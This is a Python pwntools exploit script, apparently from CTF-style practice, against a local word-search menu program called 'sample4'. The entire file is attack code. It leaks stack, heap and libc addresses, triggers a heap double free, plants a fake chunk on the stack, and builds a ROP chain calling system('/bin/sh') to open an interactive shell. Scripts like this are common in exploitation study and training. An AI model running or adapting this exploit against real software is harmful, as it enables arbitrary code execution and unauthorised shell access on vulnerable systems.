from pwn import *
import re
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample4')
elf = ELF('./data/sample4')
libc = elf.libc

def menu():
    p.recvuntil(b'3: Quit')

def index_sentence(content):
    p.sendline(b'2')
    p.sendline(str(len(content)).encode())
    p.send(content)

def search_word(word):
    p.sendline(b'1')
    p.sendline(str(len(word)).encode())
    p.send(word)

def reply_yes():
    p.sendline(b'y')

def reply_no():
    p.sendline(b'n')

def quit_app():
    menu()
    p.sendline(b'3')

def leak_stack_ptr():
    menu()
    p.send(b'a'*96)
    p.recvuntil(b'is not a valid number')
    stackptr_match = re.findall(b'a{48}(......) is not', p.recvuntil(b'is not a valid number\n'))
    stackptr = u64(stackptr_match[0] + b'\0\0')
    return stackptr

def leak_heap_ptr():
    index_sentence(b'a'*50 + b' DREAM')
    menu()
    index_sentence(b'b'*50 + b' DREAM')
    menu()
    search_word('DREAM')
    reply_yes()
    reply_yes()
    menu()
    search_word(b'\0' * 5)
    p.recvuntil(b'Found 56: ')
    heapptr = u64(p.recvuntil(b'Delete')[:8])
    reply_no()
    return heapptr - 0x10b0

def leak_libc_ptr():
    menu()
    index_sentence(('b'*256 + ' FLOWER ').ljust(512, 'c'))
    menu()
    search_word('FLOWER')
    reply_yes()
    menu()
    search_word(b'\0'*6)
    p.recvuntil(b'Found 512: ')
    mainarena88 = u64(p.recvuntil(b'Delete')[:8])
    libcbase = mainarena88 - 0x3c4b78
    reply_no()
    return libcbase

def perform_double_free():
    menu()
    index_sentence(b'a'*51 + b' ROCK')
    menu()
    index_sentence(b'b'*51 + b' ROCK')
    menu()
    index_sentence(b'c'*51 + b' ROCK')
    menu()
    search_word('ROCK')
    reply_yes()
    reply_yes()
    reply_yes()
    menu()
    search_word(b'\0' * 4)
    reply_yes()
    reply_no()

def write_to_stack_and_get_shell(stackptr, libcbase):
    menu()
    index_sentence(p64(stackptr + 0x52).ljust(48, b'\0') + b' MIRACLE')
    menu()
    index_sentence(b'd'*48 + b' MIRACLE')
    menu()
    index_sentence(b'e'*48 + b' MIRACLE')
    menu()
    rop = ROP(libc)
    pop_rdi = libcbase + rop.find_gadget(['pop rdi', 'ret']).address
    bin_sh = libcbase + next(libc.search(b'/bin/sh'))
    system_addr = libcbase + libc.sym['system']
    exit_addr = libcbase + libc.sym['exit']
    payload = (b'A'*6 + p64(pop_rdi) + p64(bin_sh) + p64(system_addr) + p64(exit_addr)).ljust(56, b'U')
    index_sentence(payload)

stack_ptr = leak_stack_ptr()#step.1
heap_base = leak_heap_ptr()#step.2
libc_base = leak_libc_ptr()#step.3
perform_double_free()#step.4
write_to_stack_and_get_shell(stack_ptr, libc_base)#step.5
quit_app()#step.6
p.interactive()